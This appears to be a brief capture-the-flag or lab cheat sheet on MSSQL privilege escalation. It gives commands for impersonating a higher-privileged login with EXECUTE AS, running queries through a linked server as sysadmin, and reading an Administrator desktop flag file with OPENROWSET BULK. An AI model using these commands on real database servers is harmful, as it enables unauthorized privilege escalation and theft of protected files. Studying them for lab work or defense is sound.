User Impersionation
```
EXECUTE AS LOGIN = 'john';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
go
```

If a user that have higher privilege can be impersonate through MSSQL, but you don't have legitimate authentication. You can execute command as that user by the following way.
```
1> SELECT srvname, isremote FROM sysservers;
2> go
srvname                                                 | isremote
--------------------------------------------------------|---------
WINSRV02\SQLEXPRESS                                     |        1
LOCAL.TEST.LINKED.SRV                                   |        0

# Confirm the comment is executable in higher privilege
1> EXECUTE('SELECT @@servername, @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV];
2> go


1> EXECUTE ('SELECT * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [LOCAL.TEST.LINKED.SRV];
2> go
```
